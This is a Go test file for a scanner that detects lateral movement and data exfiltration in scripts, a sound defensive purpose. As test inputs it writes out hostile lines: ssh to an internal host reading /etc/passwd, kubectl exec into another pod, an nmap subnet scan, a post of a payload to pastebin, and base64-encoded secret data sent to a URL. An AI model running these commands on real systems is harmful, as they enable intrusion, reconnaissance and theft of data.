package analyzer

import (
	"context"
	"testing"

	"github.com/domehahn/skil/pkg/skil"
)

func lateralFindings(t *testing.T, path, content string) []skil.Finding {
	t.Helper()
	findings, err := NewLateral().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith(path, content)})
	if err != nil {
		t.Fatal(err)
	}
	return findings
}

func TestSSHToInternalHostIsDetected(t *testing.T) {
	findings := lateralFindings(t, "run.sh", `ssh 10.0.5.3 "cat /etc/passwd"`+"\n")
	if !hasRule(findings, "SKIL-LATERAL-SSH") {
		t.Fatalf("expected SSH to an internal address to be detected: %#v", findings)
	}
}

func TestSSHToNamedExternalHostIsSafe(t *testing.T) {
	findings := lateralFindings(t, "run.sh", `ssh deploy@ci.example.com "deploy.sh"`+"\n")
	if hasRule(findings, "SKIL-LATERAL-SSH") {
		t.Fatalf("SSH to a named external host should not fire the internal-address rule: %#v", findings)
	}
}

func TestKubectlExecIntoAnotherPodIsDetected(t *testing.T) {
	findings := lateralFindings(t, "run.sh", "kubectl exec -it other-pod -- /bin/sh\n")
	if !hasRule(findings, "SKIL-LATERAL-REMOTE-EXEC") {
		t.Fatalf("expected kubectl exec to be detected: %#v", findings)
	}
}

func TestNetworkScanningToolIsDetected(t *testing.T) {
	findings := lateralFindings(t, "run.sh", "nmap -sV 10.0.0.0/24\n")
	if !hasRule(findings, "SKIL-LATERAL-SERVICE-DISCOVERY") {
		t.Fatalf("expected nmap invocation to be detected: %#v", findings)
	}
}

func TestPastebinExfiltrationIsDetected(t *testing.T) {
	findings := lateralFindings(t, "exfil.py", `requests.post("https://pastebin.com/api/api_post.php", data=payload)`+"\n")
	if !hasRule(findings, "SKIL-C2-PASTEBIN") {
		t.Fatalf("expected a pastebin destination to be detected: %#v", findings)
	}
}

func TestOrdinaryAPIDestinationIsSafe(t *testing.T) {
	findings := lateralFindings(t, "normal.py", `requests.post("https://api.example.com/upload", json={"key": "value"})`+"\n")
	if hasRule(findings, "SKIL-C2-PASTEBIN") {
		t.Fatalf("an ordinary named API destination should not fire: %#v", findings)
	}
}

func TestBase64EncodedEgressIsDetected(t *testing.T) {
	findings := lateralFindings(t, "exfil.py", `requests.post(url, data=base64.b64encode(secret_data))`+"\n")
	if !hasRule(findings, "SKIL-C2-ENCODED-EGRESS") {
		t.Fatalf("expected base64-encoded data sent directly to a network sink to be detected: %#v", findings)
	}
}

func TestPlainJSONPostIsNotEncodedEgress(t *testing.T) {
	findings := lateralFindings(t, "normal.py", `requests.post(url, json={"status": "ok"})`+"\n")
	if hasRule(findings, "SKIL-C2-ENCODED-EGRESS") {
		t.Fatalf("an ordinary plain JSON post should not fire the encoded-egress rule: %#v", findings)
	}
}
